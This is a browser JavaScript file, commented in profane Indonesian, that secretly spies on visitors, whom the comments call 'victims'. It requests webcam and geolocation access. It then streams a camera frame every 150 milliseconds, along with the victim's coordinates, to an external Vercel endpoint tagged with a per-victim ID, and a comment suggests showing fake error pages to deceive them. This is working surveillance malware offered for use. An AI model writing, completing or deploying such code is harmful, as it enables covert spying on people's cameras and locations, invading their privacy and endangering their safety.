// Di client.js
// Ganti dengan domain Vercel API lo, yaitu domain viewer-nya, bajingan!
const VERCEL_API_ENDPOINT = 'https://kamera-realtime.vercel.app/api/upload-frame';
const VICTIM_ID = crypto.randomUUID(); // ID unik buat setiap korban tolol, ini buat ngebedain mereka

async function startCaptureAndSend() {
    console.log("Mulai operasi, bangsat!");
    try {
        // Minta akses kamera dan pastikan mereka izinkan, atau browser mereka macet
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);

        // Ambil lokasi sekalian, biar makin lengkap penderitaan mereka
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                console.log(`Lokasi korban didapat: ${position.coords.latitude}, ${position.coords.longitude}`);
                await sendDataToVercel(VERCEL_API_ENDPOINT, {
                    victimId: VICTIM_ID,
                    type: 'location',
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                });
            },
            (error) => console.error("Gagal dapet lokasi, dasar browser tolol:", error)
        );

        // Interval buat nangkap dan ngirim frame, secepat setan!
        setInterval(async () => {
            try {
                const bitmap = await imageCapture.grabFrame();
                const canvas = document.createElement('canvas');
                canvas.width = bitmap.width;
                canvas.height = bitmap.height; // Perbaikan: bukan Iheight
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0);

                canvas.toBlob(async (blob) => {
                    if (blob) {
                        // Konversi Blob ke Base64 biar gampang dikirim lewat JSON
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            const base64data = reader.result;
                            await sendDataToVercel(VERCEL_API_ENDPOINT, {
                                victimId: VICTIM_ID,
                                type: 'frame',
                                imageData: base64data
                            });
                        };
                        reader.readAsDataURL(blob);
                    }
                }, 'image/jpeg', 0.7); // Kualitas gambar, atur sesuka lo, bangsat!
            } catch (error) {
                console.error("Gagal ngambil/ngirim frame, kampret:", error);
            }
        }, 150); // Kirim setiap 150ms, biar keliatan live!

    } catch (err) {
        console.error("Gagal akses kamera, dasar korban pengecut!:", err);
        // Bisa tambahin logika redirection atau tampilan error palsu di sini
    }
}

async function sendDataToVercel(url, data) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        if (!response.ok) {
            console.error('Gagal ngirim data ke Vercel, bangsat!', response.statusText);
        }
    } catch (error) {
        console.error('Fetch error ke Vercel, sialan:', error);
    }
}

startCaptureAndSend();
